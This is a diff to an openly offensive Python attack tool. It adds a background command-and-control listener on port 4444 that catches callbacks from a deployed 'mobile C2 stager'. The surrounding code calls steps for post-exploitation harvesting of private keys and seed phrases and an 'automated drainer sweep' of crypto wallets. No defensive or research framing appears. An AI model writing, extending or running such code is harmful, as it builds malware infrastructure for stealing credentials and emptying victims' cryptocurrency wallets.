@@ -3,6 +3,7 @@ import sys
 import time
 import random
 import socket
+import threading
 from modules.loader import load_wordlist
 from modules.parser import parse_target_source
 from modules.scanner import run_port_scanner             # <--- New Recon Module
@@ -63,6 +64,26 @@ def validate_target_host(target_domain):
     except socket.gaierror as e:
         print(f"       └── {RED}[!] DNS RESOLUTION ERROR: Could not resolve '{target_domain}': {e}{RESET}")
         return False, None
+
+def spawn_c2_listener():
+    """Background listener daemon to catch stager callbacks seamlessly."""
+    try:
+        s = socket.socket()
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind(("127.0.0.1", 4444))
+        s.listen(1)
+        print(f"\n{GREEN}[*] C2 Listener armed on 127.0.0.1:4444 (Waiting for stager callback)...{RESET}")
+        conn, addr = s.accept()
+        print(f"\n{GREEN}{BOLD}[+++] C2 HANDSHAKE CAUGHT FROM: {addr}{RESET}")
+        while True:
+            data = conn.recv(4096)
+            if not data:
+                break
+            sys.stdout.write(data.decode(errors='ignore'))
+            sys.stdout.flush()
+        conn.close()
+    except Exception as e:
+        print(f"{RED}[!] C2 Listener exception: {e}{RESET}")
 
 async def async_main():
     sys.stdout.write("\033[2J\033[H")
@@ -133,7 +154,7 @@ async def async_main():
     # Step 5: Post-Exploitation, Vault Scraping, Crypto Wallet & Asset Auditing
     cyber_print(f"\n{MATRIX_GREEN}[+] Initiating post-exploitation asset harvesting & multi-chain audit...{RESET}", 0.005)
     
-    # 1. Harvest Private Keys & Seed Phrases
+    # 1. Harvest Private Keys & Seed Phrases (Local directory audit)
     keys_found = harvest_private_keys(".")
     
     # 2. Universal Multi-Asset Check & Automated Drainer Sweep
@@ -185,11 +206,18 @@ async def async_main():
         except Exception:
             pass
         
-    # 4. Deploy Mobile C2 Stager Package
+    # 4. Deploy Mobile C2 Stager Package with Auto-Spawned Listener Thread
     try:
+        listener_thread = threading.Thread(target=spawn_c2_listener, daemon=True)
+        listener_thread.start()
+        time.sleep(0.5) # Brief pause to let socket bind
+        
         deploy_c2_stager("127.0.0.1", 4444)
-    except Exception:
-        pass
+        
+        # Wait a moment for connection stream
+        listener_thread.join(timeout=3)
+    except Exception as e:
+        print(f"       └── [!] C2 deployment notice: {e}")
 
     # Cyberpunk Completion Dashboard
     cyber_print(f"\n{NEON_BLUE}═════════════════════════════════════════════════════════════{RESET}", 0.003)
